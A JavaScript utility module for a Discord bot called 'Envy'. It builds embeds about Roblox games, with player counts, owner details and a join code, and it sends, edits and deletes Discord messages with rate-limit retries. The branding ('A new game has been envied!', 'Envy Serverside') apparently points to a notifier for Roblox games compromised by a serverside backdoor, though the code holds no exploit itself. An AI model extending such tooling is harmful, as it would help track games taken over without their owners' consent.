const { MAX_DESCRIPTION_LENGTH } = require('./config');

// --- Retry Logic ---
async function retry(fn, retries = 3, defaultDelay = 1000) {
    for (let i = 0; i < retries; i++) {
        try {
            return await fn();
        } catch (error) {
            if (i === retries - 1) throw error;

            let delay = defaultDelay;
            if (error.message.includes("Discord API Error on edit (429)")) {
                try {
                    const rateLimitInfo = JSON.parse(error.message.split('): ')[1]);
                    delay = Math.ceil(rateLimitInfo.retry_after * 1000) + 50; // Add a 50ms buffer
                    console.log(`Discord rate limit hit. Retrying in ${delay}ms...`);
                } catch (e) {
                    console.log(`Could not parse rate limit info. Using default delay. Error: ${e.message}`);
                }
            } else {
                console.log(`Attempt ${i + 1} failed. Retrying in ${delay}ms...`);
            }
            
            await new Promise(res => setTimeout(res, delay));
        }
    }
}

function formatNumber(n) {
    n = parseInt(n);
    if (isNaN(n)) return "Unknown";
    return n >= 1e6 ? `${(n / 1e6).toFixed(1)}M`
        : n >= 1e3 ? `${(n / 1e3).toFixed(1)}K`
        : n.toString();
}

function formatDate(dateString) {
    try {
        const date = new Date(dateString);
        const now = new Date();
        const diffMs = now - date;
        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
        const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
        const diffMinutes = Math.floor(diffMs / (1000 * 60));

        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');
        const year = date.getFullYear();
        const absoluteDate = `${month}/${day}/${year}`;

        let relativeTime;
        if (diffMinutes < 60) {
            relativeTime = `${diffMinutes} minute${diffMinutes !== 1 ? 's' : ''} ago`;
        } else if (diffHours < 24) {
            relativeTime = `${diffHours} hour${diffHours !== 1 ? 's' : ''} ago`;
        } else {
            relativeTime = `${diffDays} day${diffDays !== 1 ? 's' : ''} ago`;
        }

        return `${relativeTime} (${absoluteDate})`;
    } catch (e) {
        return "Unknown";
    }
}

function createDiscordEmbed(gameInfo, placeId, thumbnail, JobId, isNonHttp = false, components = []) {
    let creator = "";
    if (gameInfo.creator.type === "User") {
        creator = `:man_police_officer: **Owner**: [${gameInfo.creator.name}](https://www.roblox.com/users/${gameInfo.creator.id || 0}/profile)\n` +
                  `:identification_card: **ID**: \`${gameInfo.creator.id}\`\n` +
                  `:ballot_box_with_check: **Verified**: \`${gameInfo.creator.hasVerifiedBadge}\``;
    } else {
        creator = `:police_car: **Owner**: [${gameInfo.creator.name}](https://www.roblox.com/communities/${gameInfo.creator.id || 0})`;
    }

    let description = gameInfo.description || "No description";
    if (description.length > MAX_DESCRIPTION_LENGTH) {
        description = description.slice(0, MAX_DESCRIPTION_LENGTH) + '...';
    }

    return {
        content: "",
        username: "Envy Messenger",
        avatar_url: "https://i.ibb.co/TMQbDpH8/image.png",
        embeds: [{
            title: gameInfo.name,
            url: `https://www.roblox.com/games/${placeId}`,
            color: parseInt("0x8200c8", 16),
            author: {
                name: "A new game has been envied!",
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png"
            },
            thumbnail: { url: thumbnail },
            fields: [
                {
                    name: "> **Game Information**",
                    value: `:busts_in_silhouette: **Players**: \`${gameInfo.playing}\`\n` +
                           `:desktop: **Server Size**: \`${gameInfo.maxPlayers || "Unknown"}\`\n` +
                           `:eye_in_speech_bubble: **Visits**: \`${formatNumber(gameInfo.visits)}\`\n` +
                           `:star: **Favorites**: \`${formatNumber(gameInfo.favoritedCount)}\`\n` +
                           `:crossed_swords: **Genre**: \`${gameInfo.genre}\`\n` +
                           `:notepad_spiral: **Description**: \`\`\`${description}\`\`\`\n` +
                           `:date: **Last Game Update**: \`${formatDate(gameInfo.updated)}\`\n` +
                           `:zap: **Javascript Join Code**: \`\`\`js\nRoblox.GameLauncher.joinGameInstance(${placeId}, "${JobId}")\`\`\`\n`+ (isNonHttp ?  
                           `\n## :warning: WARNING: This game is non-HTTP Enabled and may provide inaccurate data.` : ""),
                    inline: true
                },
                {
                    name: "> **Owner Information**",
                    value: creator,
                    inline: true
                }
            ],
            footer: {
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png",
                text: "Envy Serverside"
            },
            timestamp: new Date().toISOString()
        }],
        components
    };
}

async function sendDiscordMessage(channelId, payload) {
    const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
    const headers = {
        'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Envy-Bot (https://github.com/nexus-devs/envy, 1.0.0)'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(payload)
        });
        if (!response.ok) {
            const errorBody = await response.text();
            console.error(`Discord API Error (${response.status}): ${errorBody}`);
            return null;
        }
        return await response.json();
    } catch (error) {
        console.error('Failed to send Discord message:', error);
        return null;
    }
}

async function editDiscordMessage(channelId, messageId, payload) {
    const url = `https://discord.com/api/v10/channels/${channelId}/messages/${messageId}`;
    const headers = {
        'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Envy-Bot (https://github.com/nexus-devs/envy, 1.0.0)'
    };

    try {
        const response = await fetch(url, {
            method: 'PATCH',
            headers: headers,
            body: JSON.stringify(payload)
        });
        if (response.ok) {
            return { success: true, data: await response.json() };
        }

        // If the message is not found, it was likely deleted.
        if (response.status === 404) {
            console.warn(`Attempted to edit a message that no longer exists: ${messageId}`);
            return { success: false, errorType: 'deleted' };
        }

        const errorBody = await response.text();
        try {
            const errorJson = JSON.parse(errorBody);
            if (errorJson.code === 30046) { // Max edits reached
                console.warn(`Max edits reached for message ${messageId}.`);
                return { success: false, errorType: 'max_edits' };
            }
        } catch (e) {
            // Not a JSON error, fall through to generic error
        }
        
        // For other errors, throw an exception to allow for retries.
        throw new Error(`Discord API Error on edit (${response.status}): ${errorBody}`);

    } catch (error) {
        console.error('Failed to edit Discord message:', error);
        // Re-throw the error to be handled by the caller (e.g., for retries).
        throw error;
    }
}

async function deleteDiscordMessage(channelId, messageId) {
    const url = `https://discord.com/api/v10/channels/${channelId}/messages/${messageId}`;
    const headers = {
        'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`,
        'User-Agent': 'Envy-Bot (https://github.com/nexus-devs/envy, 1.0.0)'
    };

    try {
        const response = await fetch(url, { method: 'DELETE', headers: headers });
        // A 204 No Content is a successful deletion.
        if (response.ok || response.status === 204) {
            return true;
        }
        // It's common for messages to be already deleted, so we treat 404 as a success.
        if (response.status === 404) {
            console.log(`Message ${messageId} was already deleted.`);
            return true;
        }
        const errorBody = await response.text();
        console.error(`Discord API Error on delete (${response.status}): ${errorBody}`);
        return false;
    } catch (error) {
        console.error('Failed to delete Discord message:', error);
        return false;
    }
}

async function createOrEditMessage(channelId, messageId, payload) {
    if (messageId) {
        try {
            // The editDiscordMessage function is now wrapped with retry logic.
            const editResult = await retry(() => editDiscordMessage(channelId, messageId, payload));
            if (editResult.success) {
                return editResult.data;
            }
            // If the message was deleted or reached max edits, we'll create a new one.
            if (editResult.errorType === 'deleted' || editResult.errorType === 'max_edits') {
                console.log(`Message ${messageId} could not be edited (${editResult.errorType}). Creating a new one.`);
                return await retry(() => sendDiscordMessage(channelId, payload));
            }
        } catch (error) {
            // A retryable error that has already been retried should be logged.
            console.error(`A final retryable error occurred while trying to edit message ${messageId}.`);
            throw error;
        }
    }
    // If there's no messageId, create a new message with retry logic.
    return await retry(() => sendDiscordMessage(channelId, payload));
}

async function getGuildIcon(guildId) {
    const url = `https://discord.com/api/v10/guilds/${guildId}`;
    const headers = {
        'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`,
        'User-Agent': 'Envy-Bot (https://github.com/nexus-devs/envy, 1.0.0)'
    };

    try {
        const response = await fetch(url, { headers });
        if (!response.ok) {
            const errorBody = await response.text();
            console.error(`Discord API Error fetching guild info (${response.status}): ${errorBody}`);
            return null;
        }
        const guild = await response.json();
        return guild.icon ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png` : null;
    } catch (error) {
        console.error('Failed to fetch guild icon:', error);
        return null;
    }
}

function createPreviewEmbed(gameInfo, guildIconUrl) {
    return {
        username: "Envy Live Preview",
        avatar_url: "https://i.ibb.co/TMQbDpH8/image.png",
        embeds: [{
            color: parseInt("0x8200c8", 16),
            thumbnail: { url: guildIconUrl },
            fields: [
                { name: "Players", value: `\`${gameInfo.playing}\``, inline: true },
                { name: "Visits", value: `\`${formatNumber(gameInfo.visits)}\``, inline: true },
                { name: "Favorites", value: `\`${formatNumber(gameInfo.favoritedCount)}\``, inline: true },
                { name: "Genre", value: `\`${gameInfo.genre}\``, inline: true },
            ],
            footer: {
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png",
                text: "Envy Serverside"
            },
            timestamp: new Date().toISOString()
        }]
    };
}

module.exports = { createDiscordEmbed, sendDiscordMessage, editDiscordMessage, deleteDiscordMessage, createOrEditMessage, getGuildIcon, createPreviewEmbed };
